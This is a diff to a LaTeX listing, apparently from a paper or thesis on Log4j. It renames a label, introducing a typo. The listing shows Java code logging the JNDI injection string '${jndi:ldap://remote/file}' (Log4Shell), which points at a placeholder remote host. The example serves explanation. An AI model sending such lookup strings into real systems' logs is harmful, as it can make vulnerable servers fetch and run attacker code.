@@ -1,7 +1,7 @@
 %! Author = chaorn
 %! Date = 07.01.23
 
-\begin{lstlisting}[language=java, label=jndi-lookup-log.java]
+\begin{lstlisting}[language=java, label=JNDILokupLog.java]
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 public class MyClass {
@@ -10,4 +10,4 @@ public class MyClass {
        LOGGER.error("{}: ERROR {}", "${jndi:ldap://remote/file}", error.getMessage());
 }
 \end{lstlisting}
-\captionof{lstlisting}{\texttt{jndi-lookup-log.java}: JNDI-lookup}
+\captionof{lstlisting}{\texttt{JNDILookupLog.java}: JNDI-lookup}
